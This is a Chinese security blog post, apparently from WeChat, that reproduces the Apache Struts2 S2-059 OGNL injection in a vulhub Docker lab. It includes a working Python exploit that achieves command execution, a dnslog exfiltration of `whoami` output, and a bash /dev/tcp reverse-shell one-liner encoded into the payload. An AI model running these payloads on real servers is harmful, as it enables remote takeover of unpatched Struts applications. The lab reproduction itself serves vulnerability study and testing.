> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/Yt_9troK0uDW2XHxlfGKjg)

![](https://mmbiz.qpic.cn/mmbiz_gif/3xxicXNlTXLicwgPqvK8QgwnCr09iaSllrsXJLMkThiaHibEntZKkJiaicEd4ibWQxyn3gtAWbyGqtHVb0qqsHFC9jW3oQ/640?wx_fmt=gif)

> **文章来****源： Admin Team**

s2-059
------

### `Struts2`介绍

是一个基于 MVC 设计模式的 Web 应用框架，它本质上相当于一个 servlet，在 MVC 设计模式中，`Struts2`作为控制器 (Controller) 来建立模型与视图的数据交互。Struts 2 是 Struts 的下一代产品，是在 struts 1 和 WebWork 的技术基础上进行了合并的全新的 Struts 2 框架。其全新的 Struts 2 的体系结构与 Struts 1 的体系结构差别巨大。Struts 2 以 WebWork 为核心，采用拦截器的机制来处理用户的请求，这样的设计也使得业务逻辑控制器能够与 ServletAPI 完全脱离开，所以 Struts 2 可以理解为 WebWork 的更新产品。虽然从 Struts 1 到 Struts 2 有着非常大的变化，但是相对于 WebWork，Struts 2 的变化很小。

### st2-059 介绍

2020 年 8 月 13 日, Apache 官方发布了一则公告, 该公告称 Apache `Struts2`使用某些标签时, 会对标签属性值进行二次表达式解析, 当标签属性值使用了 %{skillName} 并且 skillName 的值用户可以控制, 就会造成 OGNL 表达式执行。

### 漏洞复现

vulunmb 拉环境

> vulhub/`Struts2`/s2-059 docker-compose up -d  // 启动漏洞环境![](https://mmbiz.qpic.cn/mmbiz_png/b4zGuE1C5nacib7rHjsibFVDa08YibfaOiaqMicqTJ9Pl2x0n7qWicJa74wUnia421LeYiadPn66oicM8Pmic5cTU9ajJnJA/640?wx_fmt=png)

图 1. docker 启动漏洞环境

![](https://mmbiz.qpic.cn/mmbiz_png/b4zGuE1C5nacib7rHjsibFVDa08YibfaOiaqw8La1icrg0yLf6SzNlATeIibEXf3Hwr1VHIXNhBrRR2ficWL0oiaGApFnA/640?wx_fmt=png)

图 2. s2-059 漏洞环境

> EXP 地址: https://vulhub.org/#/environments/`Struts2`/s2-059/ 官网给的 exp 是没有回显的

```
import requestsurl = "http://127.0.0.1:8080"data1 = {    "id": "%{(#context=#attr['struts.valueStack'].context).(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses('')).(#ognlUtil.setExcludedPackageNames(''))}"}data2 = {    "id": "%{(#context=#attr['struts.valueStack'].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec('touch /tmp/success'))}"}res1 = requests.post(url, data=data1)# print(res1.text)res2 = requests.post(url, data=data2)# print(res2.text)
```

可以进行修改 修改为 ping xxx.dnslog.cn 这个可以直接执行坑点 由于是 java 的需要进行编码 将其名带外输出

> `whoami`.koeep8.dnslog.cn 在线编码：http://www.jackson-t.ca/runtime-exec-payloads.html![](https://mmbiz.qpic.cn/mmbiz_png/b4zGuE1C5nacib7rHjsibFVDa08YibfaOiaqFo7RA5xv2037f14icnPd1aJgicmExry9CrGD8G23RtFeX7WvlpkHCn1A/640?wx_fmt=png)

图 3. base64 编码截图

![](https://mmbiz.qpic.cn/mmbiz_png/b4zGuE1C5nacib7rHjsibFVDa08YibfaOiaq07E9ic9DcsoE7TaRQuJOMNWUBYGaMwC6bqy6yy7zQ9mJsSwZquFiawPg/640?wx_fmt=png)攻击测试![](https://mmbiz.qpic.cn/mmbiz_png/b4zGuE1C5nacib7rHjsibFVDa08YibfaOiaqvic1Ue5F0ZL5ZoS0Tu3IbQsExOx7NsRpKKof7Kp2icOgOOjpJZ88WwAQ/640?wx_fmt=png)

### 反弹 shell

> bash -i >& /dev/tcp/Your ip/Your port 0>&1

![](https://mmbiz.qpic.cn/mmbiz_png/b4zGuE1C5nacib7rHjsibFVDa08YibfaOiaqCrs9ay2qwOpM6QebXUUWd9ibOqAaHB7eTVqTwYF7rDibKobYlvGFjLfQ/640?wx_fmt=png)

base 编码随后替换

![](https://mmbiz.qpic.cn/mmbiz_png/b4zGuE1C5nacib7rHjsibFVDa08YibfaOiaqHcYmX5h7ALx6X0aJqkuXSI5y9ycPt2JoOFK1ibkeW4R0SQDsXV0ep8A/640?wx_fmt=png)

图 3. 反弹 shell 成功

![](https://mmbiz.qpic.cn/mmbiz_jpg/3xxicXNlTXLicjiasf4mjVyxw4RbQt9odm9nxs9434icI9TG8AXHjS3Btc6nTWgSPGkvvXMb7jzFUTbWP7TKu6EJ6g/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_png/3xxicXNlTXLib0FWIDRa9Kwh52ibXkf9AAkntMYBpLvaibEiaVibzNO1jiaVV7eSibPuMU3mZfCK8fWz6LicAAzHOM8bZUw/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_gif/NZycfjXibQzlug4f7dWSUNbmSAia9VeEY0umcbm5fPmqdHj2d12xlsic4wefHeHYJsxjlaMSJKHAJxHnr1S24t5DQ/640?wx_fmt=gif)